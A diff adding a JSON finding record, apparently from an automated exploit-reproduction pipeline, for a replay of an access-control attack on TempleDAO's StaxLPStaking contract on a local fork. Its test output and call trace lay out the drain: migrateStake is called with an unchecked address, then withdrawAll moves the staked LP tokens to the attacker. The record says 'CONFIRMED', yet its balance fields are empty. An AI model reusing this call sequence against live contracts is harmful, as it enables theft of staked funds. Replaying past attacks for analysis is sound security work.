@@ -1,0 +1,19 @@
+{
+  "finding_id": "ad-hoc-1780962981",
+  "tx_hash": "0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5",
+  "chain": "ethereum",
+  "fork_block": 15725066,
+  "status": "CONFIRMED",
+  "confidence": 0.7,
+  "state_diff": {
+    "pre": {},
+    "post": {}
+  },
+  "attacker_gain_eth": null,
+  "target_loss_eth": null,
+  "test_passed": true,
+  "test_output": "No files changed, compilation skipped\n\nRan 1 test for Exploit.t.sol:TempleDaoAccessControlReplay\n[PASS] test_templeDaoAccessControlDrain() (gas: 142863)\nLogs:\n  ATTACKER_LP_GAIN: 321154.865567124596801893\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.53ms (1.37ms CPU time)\n\nRan 1 test suite in 787.90ms (4.53ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n\n",
+  "trace_summary": "Traces:\n  [179945] 0x2Df9c154fe24D081cfE568645Fb4075d725431e0::233805fb()\n    \u251c\u2500 [2624] StaxLP::balanceOf(StaxLPStaking: [0xd2869042E12a3506100af1D192b5b04D65137941]) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 321154865567124596801893 [3.211e23]\n    \u251c\u2500 [113571] StaxLPStaking::migrateStake(0x9bdb04493aF17eB318A23BfeFe43f07b3E58EcFb, 321154865567124596801893 [3.211e23])\n    \u2502   \u251c\u2500 [2773] 0x9bdb04493aF17eB318A23BfeFe43f07b3E58EcFb::migrateWithdraw(0x2Df9c154fe24D081cfE568645Fb4075d725431e0, 321154865567124596801893 [3.211e23])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Stop]\n    \u2502   \u251c\u2500 emit Staked(user: 0x2Df9c154fe24D081cfE568645Fb4075d725431e0, amount: 321154865567124596801893 [3.211e23])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [46029] StaxLPStaking::withdrawAll(false)\n    \u2502   \u251c\u2500 [27870] StaxLP::transfer(0x2Df9c154fe24D081cfE568645Fb4075d725431e0, 321154865567124596801893 [3.211e23])\n    \u2502   \u2502   \u251c\u2500 emit Transfer(from: StaxLPStaking: [0xd2869042E12a3506100af1D192b5b04D65137941], to: 0x2Df9c154fe24D081cfE568645Fb4075d725431e0, value: 321154865567124596801893 [3.211e23])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 emit Withdrawn(user: 0x2Df9c154fe24D081cfE568645Fb4075d725431e0, toAddress: 0x2Df9c154fe24D081cfE568645Fb4075d725431e0, amount: 321154865567124596801893 [3.211e23])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [624] StaxLP::balanceOf(0x2Df9c154fe24D081cfE568645Fb4075d725431e0) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 321154865567124596801893 [3.211e23]\n    \u2514\u2500 \u2190 [Stop]\n\n\nTransaction successfully executed.\nGas used: 173509",
+  "reason": "Foundry exploit test passed \u2014 exploit reproduced per the test's own assertions on a local fork (ETH gain is asserted inside the test, not measured via fork balances)",
+  "duration_secs": 8.2
+}
